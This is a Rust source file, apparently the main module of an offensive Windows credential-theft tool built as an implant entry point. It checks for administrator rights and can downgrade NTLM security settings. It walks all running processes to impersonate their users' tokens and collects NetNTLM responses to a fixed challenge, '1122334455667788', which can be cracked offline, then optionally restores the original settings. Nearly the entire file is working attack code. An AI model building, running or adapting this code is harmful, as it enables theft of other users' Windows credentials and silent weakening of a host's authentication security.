#![allow(static_mut_refs, unused)]
#![no_std]
#![no_main]
mod helper;
mod soliloquy;
mod types;
mod utils;
mod win32;

#[cfg(feature = "downgrade")]
mod ntlm;

extern crate alloc;

use core::panic::PanicInfo;

use alloc::{
    borrow::ToOwned,
    string::{String, ToString},
    vec::Vec,
};
use libc_print::libc_println;

use soliloquy::soliloquy;

use types::Response;

use win32::def::PROCESS_QUERY_LIMITED_INFORMATION;
#[cfg(feature = "impersonate")]
use win32::{
    def::{
        ClientId, ObjectAttributes, SystemProcessInformation, HANDLE, NT_SUCCESS,
        OBJ_CASE_INSENSITIVE,
    },
    ntdll::ntdll,
};

#[cfg(feature = "impersonate")]
use soliloquy::handle_process;

#[cfg(feature = "downgrade")]
use ntlm::ntlm_downgrade;

#[cfg(feature = "restore")]
use ntlm::nt_ntlm_restore;

#[cfg(feature = "threads")]
use soliloquy::handle_thread;

#[cfg(feature = "verbose")]
use win32::def::NT_STATUS;

use crate::win32::allocator::NtVirtualAlloc;

#[global_allocator]
static GLOBAL: NtVirtualAlloc = NtVirtualAlloc;

static mut AUTHENTICATED_USERS: Vec<String> = Vec::new();

#[no_mangle]
#[allow(unused_variables, unused_mut)]
pub extern "C" fn go() {
    let challenge = "1122334455667788".to_owned();
    let mut responses = Response::new();

    // Check if the process is running with elevated privileges
    let is_elevated = helper::is_elevated();

    if is_elevated {
        _print!("[+] Running elevated");

        let mut old_lm_compatibility_level: Option<u32> = None;
        let mut old_ntlm_min_client_sec: Option<u32> = None;
        let mut old_restrict_sending_ntlm_traffic: Option<u32> = None;

        // Perform NTLM downgrade if enabled
        #[cfg(feature = "downgrade")]
        {
            _print!("[+] Performing NTLM Downgrade");

            ntlm_downgrade(
                &mut old_lm_compatibility_level,
                &mut old_ntlm_min_client_sec,
                &mut old_restrict_sending_ntlm_traffic,
            );
        }

        // Perform impersonation if enabled
        #[cfg(feature = "impersonate")]
        {
            _print!("[+] Starting impersonation");

            let mut snapshot: *mut SystemProcessInformation = core::ptr::null_mut();
            let mut size: usize = 0;

            // Retrieve a snapshot of system processes
            let status = unsafe { helper::get_processes(&mut snapshot, &mut size) };

            if NT_SUCCESS(status) {
                let mut current = snapshot;

                while !current.is_null() {
                    let pid = unsafe { (*current).unique_process_id as u32 };

                    let mut object_attributes = ObjectAttributes::new();

                    ObjectAttributes::initialize(
                        &mut object_attributes,
                        core::ptr::null_mut(),
                        OBJ_CASE_INSENSITIVE,
                        core::ptr::null_mut(),
                        core::ptr::null_mut(),
                    );

                    let mut client_id = ClientId::new();
                    client_id.unique_process = pid as *mut core::ffi::c_void;

                    let mut process_handle: HANDLE = core::ptr::null_mut();

                    // Open the target process with the specified process ID
                    let _ = unsafe {
                        ntdll().nt_open_process.run(
                            &mut process_handle,
                            PROCESS_QUERY_LIMITED_INFORMATION, // 0x1000
                            &mut object_attributes,
                            &mut client_id,
                        )
                    };

                    if process_handle.is_null() {
                        if unsafe { (*current).next_entry_offset == 0 } {
                            break;
                        }
                        current = unsafe {
                            (current as *const u8).add((*current).next_entry_offset as usize)
                                as *mut SystemProcessInformation
                        };
                        continue;
                    }

                    let mut process_name = String::new();

                    // Retrieve the process name if available
                    unsafe {
                        if !(*current).image_name.buffer.is_null() {
                            process_name =
                                utils::unicodestring_to_string(&(*current).image_name).unwrap();
                        }
                    }

                    // Handle the target process
                    if let Some(response) =
                        handle_process(process_handle, challenge.as_str(), pid, &process_name)
                    {
                        responses.add(&response.to_string());

                        // If thread handling is enabled, process each thread in the target process
                        #[cfg(feature = "threads")]
                        {
                            unsafe {
                                let mut thread_info = (*current).threads.as_ptr();
                                for _ in 0..(*current).number_of_threads {
                                    if !thread_info.is_null() {
                                        let thread_id =
                                            (*thread_info).client_id.unique_thread as u32;

                                        if let Some(thread_response) =
                                            handle_thread(thread_id, challenge.as_str())
                                        {
                                            responses.add(&thread_response.to_string());
                                        }

                                        thread_info = thread_info.add(1);
                                    }
                                }
                            }
                        }
                    }

                    // Move to the next process in the snapshot
                    if unsafe { (*current).next_entry_offset == 0 } {
                        break;
                    }
                    current = unsafe {
                        (current as *const u8).add((*current).next_entry_offset as usize)
                            as *mut SystemProcessInformation
                    };
                }
            } else {
                _print!(
                    "[-] Failed to retrieve process snapshot with status: {}",
                    NT_STATUS(status)
                );
            }
        }

        #[cfg(not(feature = "impersonate"))]
        {
            _print!("[+] Performing operation on current user only (no impersonation)");

            match soliloquy(challenge.as_str(), true) {
                Some(valid_result) => {
                    responses.add(&valid_result.to_string());
                }
                None => {
                    #[cfg(not(feature = "verbose"))]
                    {
                        libc_println!("error");
                    }
                }
            }
        }

        // Restore NTLM settings if necessary
        #[cfg(all(feature = "downgrade", feature = "restore"))]
        {
            _print!("[+] Restoring NTLM values");

            nt_ntlm_restore(
                old_lm_compatibility_level,
                old_ntlm_min_client_sec,
                old_restrict_sending_ntlm_traffic,
            );
        }
    } else {
        // Perform attack with current NTLM settings without elevated privileges
        _print!(
            "[!] Not elevated. Performing operation with current NTLM settings on current user"
        );
        match soliloquy(challenge.as_str(), true) {
            Some(valid_result) => {
                responses.add(&valid_result.to_string());
            }
            None => {
                #[cfg(not(feature = "verbose"))]
                {
                    libc_println!("error");
                }
            }
        }
    }

    libc_println!("{}", responses);
}

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}
